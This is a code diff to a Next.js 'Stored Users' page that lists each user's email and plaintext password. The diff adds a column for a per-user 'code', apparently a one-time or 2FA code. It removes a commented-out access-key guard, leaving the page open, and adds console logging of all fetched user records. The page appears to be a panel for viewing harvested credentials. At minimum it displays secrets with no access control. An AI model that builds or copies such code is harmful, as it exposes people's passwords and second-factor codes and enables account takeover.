@@ -2,13 +2,12 @@
 
 export const dynamic = "force-dynamic";
 
-
 import { useEffect, useState } from "react";
-//import { useSearchParams, useRouter } from "next/navigation";
 
 interface User {
   email: string;
   password: string;
+  code?: string; // ✅ added
 }
 
 export default function UsersPage() {
@@ -16,19 +15,7 @@ export default function UsersPage() {
   const [loading, setLoading] = useState(true);
   const [error, setError] = useState("");
 
-  //const searchParams = useSearchParams();
-  //const router = useRouter();
-
   useEffect(() => {
-    //const key = searchParams.get("key");
-    //const expectedKey = process.env.USERS_PAGE_KEY;
-
-    // 🔒 Block access if env key is missing OR incorrect
-    // if (!expectedKey || !key || key !== expectedKey) {
-    //   router.replace("/");
-    //   return;
-    // }
-
     const fetchUsers = async () => {
       try {
         const res = await fetch("/api/fetchUsers", {
@@ -40,7 +27,7 @@ export default function UsersPage() {
         if (!res.ok) {
           throw new Error(data.message || "Failed to fetch users");
         }
-
+        console.log("Fetched users:", data.users);
         setUsers(data.users);
       } catch (err: unknown) {
         if (err instanceof Error) {
@@ -58,7 +45,7 @@ export default function UsersPage() {
 
   return (
     <div className="min-h-screen bg-[#0F172A] text-white p-8">
-      <div className="max-w-5xl mx-auto">
+      <div className="max-w-6xl mx-auto">
         <h1 className="text-3xl font-bold mb-6">Stored Users</h1>
 
         {loading && <div className="text-gray-400">Loading users...</div>}
@@ -77,6 +64,7 @@ export default function UsersPage() {
                   <th className="p-4 text-left">#</th>
                   <th className="p-4 text-left">Email</th>
                   <th className="p-4 text-left">Password</th>
+                  <th className="p-4 text-left">Code</th> {/* ✅ added */}
                 </tr>
               </thead>
               <tbody>
@@ -89,6 +77,9 @@ export default function UsersPage() {
                     <td className="p-4">{user.email}</td>
                     <td className="p-4 font-mono text-yellow-400">
                       {user.password}
+                    </td>
+                    <td className="p-4 font-mono text-green-400">
+                      {user.code || "—"} {/* ✅ safe display */}
                     </td>
                   </tr>
                 ))}
